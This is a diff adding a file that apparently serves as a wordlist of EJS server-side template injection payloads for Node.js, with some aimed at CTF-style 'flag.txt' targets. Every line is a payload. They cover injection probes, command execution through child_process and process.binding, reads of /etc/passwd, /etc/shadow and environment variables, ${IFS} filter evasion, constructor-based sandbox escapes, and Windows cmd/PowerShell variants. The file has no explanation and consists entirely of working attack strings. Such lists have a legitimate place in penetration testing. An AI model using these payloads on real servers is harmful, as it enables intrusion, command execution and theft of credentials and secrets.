@@ -1,0 +1,200 @@
+<%= 7*7 %>
+<%= 7*'7' %>
+<%= global %>
+<%= process %>
+<%= global.process %>
+<%= process.mainModule %>
+<%= process.mainModule.require %>
+<%= process.mainModule.require('child_process') %>
+<%= process.mainModule.require('child_process').exec('id') %>
+<%= process.mainModule.require('child_process').exec('whoami') %>
+<%= process.mainModule.require('child_process').exec('cat /etc/passwd') %>
+<%= process.mainModule.require('child_process').exec('ls -la') %>
+<%= process.mainModule.require('child_process').exec('uname -a') %>
+<%= process.mainModule.require('child_process').exec('pwd') %>
+<%= process.mainModule.require('child_process').exec('env') %>
+<%= process.mainModule.require('child_process').exec('cat flag.txt') %>
+<%= process.mainModule.require('child_process').exec('ps aux') %>
+<%= process.mainModule.require('child_process').exec('ifconfig') %>
+<%= process.mainModule.require('child_process').exec('netstat -an') %>
+<%= process.mainModule.require('child_process').exec('cat /etc/shadow') %>
+<%= process.mainModule.require('child_process').execSync('id').toString() %>
+<%= process.mainModule.require('child_process').execSync('whoami').toString() %>
+<%= process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>
+<%= process.mainModule.require('child_process').execSync('ls -la').toString() %>
+<%= process.mainModule.require('child_process').execSync('uname -a').toString() %>
+<%= process.mainModule.require('child_process').execSync('pwd').toString() %>
+<%= process.mainModule.require('child_process').execSync('env').toString() %>
+<%= process.mainModule.require('child_process').execSync('cat flag.txt').toString() %>
+<%= process.mainModule.require('child_process').execSync('ps aux').toString() %>
+<%= process.mainModule.require('child_process').execSync('ifconfig').toString() %>
+<%= process.mainModule.require('child_process').execSync('netstat -an').toString() %>
+<%= process.mainModule.require('child_process').execSync('cat /etc/shadow').toString() %>
+<%= process.mainModule.require('child_process').spawnSync('id').stdout.toString() %>
+<%= process.mainModule.require('child_process').spawnSync('whoami').stdout.toString() %>
+<%= process.mainModule.require('child_process').spawnSync('cat',['/etc/passwd']).stdout.toString() %>
+<%= process.mainModule.require('child_process').spawnSync('ls',['-la']).stdout.toString() %>
+<%= process.mainModule.require('child_process').spawnSync('uname',['-a']).stdout.toString() %>
+<%= process.mainModule.require('child_process').spawnSync('pwd').stdout.toString() %>
+<%= process.mainModule.require('child_process').spawnSync('env').stdout.toString() %>
+<%= process.mainModule.require('child_process').spawnSync('cat',['flag.txt']).stdout.toString() %>
+<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
+<%= global.process.mainModule.require('child_process').execSync('whoami').toString() %>
+<%= global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>
+<%= global.process.mainModule.require('child_process').execSync('ls -la').toString() %>
+<%= global.process.mainModule.require('child_process').execSync('uname -a').toString() %>
+<%= process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','id'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString() %>
+<%= process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','whoami'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString() %>
+<%= process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','cat /etc/passwd'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString() %>
+<%= process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','ls -la'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString() %>
+<%= process.env %>
+<%= process.env.PATH %>
+<%= process.env.HOME %>
+<%= process.env.USER %>
+<%= process.env.SHELL %>
+<%= process.version %>
+<%= process.versions %>
+<%= process.platform %>
+<%= process.arch %>
+<%= process.release %>
+<%= process.config %>
+<%= process.pid %>
+<%= process.ppid %>
+<%= process.cwd() %>
+<%= process.execPath %>
+<%= process.argv %>
+<%= process.execArgv %>
+<%= process.memoryUsage() %>
+<%= process.uptime() %>
+<%= global.process.env %>
+<%= global.process.version %>
+<%= global.process.platform %>
+<%= global.process.cwd() %>
+<%= process.mainModule.require('fs').readFileSync('/etc/passwd','utf8') %>
+<%= process.mainModule.require('fs').readFileSync('flag.txt','utf8') %>
+<%= process.mainModule.require('fs').readdirSync('/') %>
+<%= process.mainModule.require('fs').readdirSync('.') %>
+<%= process.mainModule.require('fs').existsSync('/etc/passwd') %>
+<%= process.mainModule.require('fs').statSync('/etc/passwd') %>
+<%= global.process.mainModule.require('fs').readFileSync('/etc/passwd','utf8') %>
+<%= global.process.mainModule.require('fs').readFileSync('flag.txt','utf8') %>
+<%= global.process.mainModule.require('fs').readdirSync('/') %>
+<%= process.mainModule.constructor._load('child_process').execSync('id').toString() %>
+<%= process.mainModule.constructor._load('child_process').execSync('whoami').toString() %>
+<%= process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString() %>
+<%= process.mainModule.constructor._load('child_process').execSync('ls -la').toString() %>
+<%= process.mainModule.constructor._load('child_process').execSync('uname -a').toString() %>
+<%= process.mainModule.constructor._load('fs').readFileSync('/etc/passwd','utf8') %>
+<%= process.mainModule.constructor._load('fs').readFileSync('flag.txt','utf8') %>
+<%= process.mainModule.constructor._load('fs').readdirSync('/') %>
+<%= process.mainModule.require('child_process').spawn('id') %>
+<%= process.mainModule.require('child_process').spawn('whoami') %>
+<%= process.mainModule.require('child_process').spawn('cat',['/etc/passwd']) %>
+<%= process.mainModule.require('child_process').spawn('ls',['-la']) %>
+<%= process.mainModule.require('os').hostname() %>
+<%= process.mainModule.require('os').type() %>
+<%= process.mainModule.require('os').platform() %>
+<%= process.mainModule.require('os').arch() %>
+<%= process.mainModule.require('os').release() %>
+<%= process.mainModule.require('os').uptime() %>
+<%= process.mainModule.require('os').loadavg() %>
+<%= process.mainModule.require('os').totalmem() %>
+<%= process.mainModule.require('os').freemem() %>
+<%= process.mainModule.require('os').cpus() %>
+<%= process.mainModule.require('os').networkInterfaces() %>
+<%= process.mainModule.require('os').userInfo() %>
+<%= process.mainModule.require('os').homedir() %>
+<%= process.mainModule.require('os').tmpdir() %>
+<%= require('child_process').execSync('id').toString() %>
+<%= require('child_process').execSync('whoami').toString() %>
+<%= require('child_process').execSync('cat /etc/passwd').toString() %>
+<%= require('child_process').execSync('ls -la').toString() %>
+<%= require('child_process').execSync('uname -a').toString() %>
+<%= require('child_process').execSync('pwd').toString() %>
+<%= require('child_process').execSync('env').toString() %>
+<%= require('child_process').execSync('cat flag.txt').toString() %>
+<%= require('child_process').exec('id') %>
+<%= require('child_process').exec('whoami') %>
+<%= require('child_process').exec('cat /etc/passwd') %>
+<%= require('fs').readFileSync('/etc/passwd','utf8') %>
+<%= require('fs').readFileSync('flag.txt','utf8') %>
+<%= require('fs').readdirSync('/') %>
+<%= require('fs').readdirSync('.') %>
+<%= require('os').hostname() %>
+<%= require('os').userInfo() %>
+<%= require('os').networkInterfaces() %>
+<%- process.mainModule.require('child_process').execSync('id').toString() %>
+<%- process.mainModule.require('child_process').execSync('whoami').toString() %>
+<%- process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>
+<%- process.mainModule.require('child_process').execSync('ls -la').toString() %>
+<%- process.mainModule.require('fs').readFileSync('/etc/passwd','utf8') %>
+<%- process.mainModule.require('fs').readFileSync('flag.txt','utf8') %>
+<%- global.process.mainModule.require('child_process').execSync('id').toString() %>
+<%- global.process.mainModule.require('child_process').execSync('whoami').toString() %>
+<%- require('child_process').execSync('id').toString() %>
+<%- require('child_process').execSync('whoami').toString() %>
+<%- require('fs').readFileSync('/etc/passwd','utf8') %>
+<% var x = process.mainModule.require('child_process').execSync('id').toString(); %><%=x%>
+<% var x = process.mainModule.require('child_process').execSync('whoami').toString(); %><%=x%>
+<% var x = process.mainModule.require('child_process').execSync('cat /etc/passwd').toString(); %><%=x%>
+<% var x = process.mainModule.require('fs').readFileSync('/etc/passwd','utf8'); %><%=x%>
+<% var x = process.mainModule.require('fs').readFileSync('flag.txt','utf8'); %><%=x%>
+<%= process.mainModule.require('child_process').execSync('cat${IFS}/etc/passwd').toString() %>
+<%= process.mainModule.require('child_process').execSync('cat$IFS/etc/passwd').toString() %>
+<%= process.mainModule.require('child_process').spawnSync('sh',['-c','cat</etc/passwd']).stdout.toString() %>
+<%= process.mainModule.require('child_process').spawnSync('sh',['-c','cat<flag.txt']).stdout.toString() %>
+<%= process.mainModule.require('child_process').execSync('calc').toString() %>
+<%= process.mainModule.require('child_process').execSync('cmd /c calc').toString() %>
+<%= process.mainModule.require('child_process').execSync('cmd /c dir').toString() %>
+<%= process.mainModule.require('child_process').execSync('powershell.exe').toString() %>
+<%= process.mainModule.require('child_process').execSync('cmd.exe /c whoami').toString() %>
+<%= process.mainModule.require('child_process').spawnSync('cmd',['/c','whoami']).stdout.toString() %>
+<%= process.mainModule.require('child_process').spawnSync('powershell',['-c','whoami']).stdout.toString() %>
+<%= require('child_process').execSync('cmd /c whoami').toString() %>
+<%= require('child_process').execSync('powershell -c whoami').toString() %>
+<%= process.mainModule.require('net').isIP('127.0.0.1') %>
+<%= process.mainModule.require('dns').lookup('localhost') %>
+<%= process.mainModule.require('http').request %>
+<%= process.mainModule.require('https').request %>
+<%= process.mainModule.require('url').parse('http://example.com') %>
+<%= process.mainModule.require('path').resolve('/') %>
+<%= process.mainModule.require('path').dirname('/etc/passwd') %>
+<%= process.mainModule.require('crypto').getHashes() %>
+<%= process.mainModule.require('crypto').getCiphers() %>
+<%= process.mainModule.require('util').inspect(process) %>
+<%= process.mainModule.require('util').inspect(global) %>
+<%= process.mainModule.require('util').inspect(process.env) %>
+<%= Function('return this')() %>
+<%= Function('return process')() %>
+<%= Function('return global')() %>
+<%= Function('return process.mainModule.require("child_process").execSync("id").toString()')() %>
+<%= Function('return process.mainModule.require("child_process").execSync("whoami").toString()')() %>
+<%= Function('return process.mainModule.require("child_process").execSync("cat /etc/passwd").toString()')() %>
+<%= Function('return process.mainModule.require("fs").readFileSync("/etc/passwd","utf8")')() %>
+<%= constructor.constructor('return process')() %>
+<%= constructor.constructor('return global')() %>
+<%= constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')() %>
+<%= constructor.constructor('return process.mainModule.require("child_process").execSync("whoami").toString()')() %>
+<%= constructor.constructor('return process.mainModule.require("fs").readFileSync("/etc/passwd","utf8")')() %>
+<%- Function('return process.mainModule.require("child_process").execSync("id").toString()')() %>
+<%- Function('return process.mainModule.require("child_process").execSync("whoami").toString()')() %>
+<%- constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')() %>
+<% return process.mainModule.require('child_process').execSync('id').toString() %>
+<% return process.mainModule.require('child_process').execSync('whoami').toString() %>
+<% return process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>
+<% return process.mainModule.require('fs').readFileSync('/etc/passwd','utf8') %>
+<%=JSON.stringify(process.env)%>
+<%=JSON.stringify(process.versions)%>
+<%=JSON.stringify(process.config)%>
+<%=JSON.stringify(process.mainModule)%>
+<%=Object.keys(process)%>
+<%=Object.keys(global)%>
+<%=Object.getOwnPropertyNames(process)%>
+<%=Object.getOwnPropertyNames(global)%>
+<%= this %>
+<%= this.process %>
+<%= this.global %>
+<%= this.constructor %>
+<%= this.constructor.constructor('return process')() %>
+<%= this.constructor.constructor('return global')() %>
+<%= this.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')() %>
